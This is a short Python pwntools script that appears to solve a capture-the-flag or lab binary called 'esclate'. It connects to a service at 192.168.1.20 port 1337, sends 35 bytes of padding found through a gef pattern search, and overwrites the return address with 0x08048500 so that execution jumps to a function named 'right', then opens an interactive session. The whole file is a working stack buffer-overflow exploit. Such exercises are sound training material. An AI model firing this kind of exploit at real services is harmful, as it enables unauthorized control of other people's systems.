#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

# target --
#p = process("./esclate")
p = connect("192.168.1.20", 1337)

# gef➤  pattern search 0x61616a61
# [+] Searching '0x61616a61'
# [+] Found at offset 35 (little-endian search) likely
pad = ("A" * 35).encode()

# cutter re --
# jump to this function --
# 49: sym.right ();
# ; var int32_t var_18h @ esp+0x4
# 0x08048500      push ebp
buf = bytes(pad) + pack(0x8048500, 'all', 'little', True)

pause()
p.sendline(buf)
p.interactive()
